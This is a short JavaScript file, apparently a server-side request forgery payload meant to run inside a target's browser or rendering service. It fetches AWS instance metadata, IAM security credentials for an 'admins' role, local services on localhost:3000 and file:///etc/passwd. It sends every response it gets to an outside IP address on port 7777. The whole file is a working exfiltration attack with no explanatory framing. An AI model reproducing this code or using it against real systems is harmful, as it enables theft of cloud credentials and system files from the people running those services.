
function handler() {
  console.log(1);
  if(this.status == 200 && this.responseText != null) {
    // success!
      //do whatever you want
      var xhr2 = new XMLHttpRequest();
      //xhr2.onreadystatechange = none; 
      xhr2.open("GET", 'http://192.241.169.35:7777/SSRF?u='+encodeURIComponent(this.responseText), true);
      xhr2.send();

  } else {
    // something went wrong
    //console.log("hmmm...")
  }
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = handler;

var urls = ["http://169.254.169.254/latest/dynamic/instance-identity/document","http://169.254.169.254/latest/meta-data/iam/security-credentials/admins","http://localhost:3000","http://localhost:3000/1/catalogs","http://ifconfig.pro","http://192.241.169.35:7777/url5","file:///etc/passwd"];
var arrayLength = urls.length;
for (var i = 0; i < arrayLength; i++) {
   try{
    xhr.open("GET", urls[i], true);
    xhr.send();
 } catch(err) { console.log(err); }
}



 
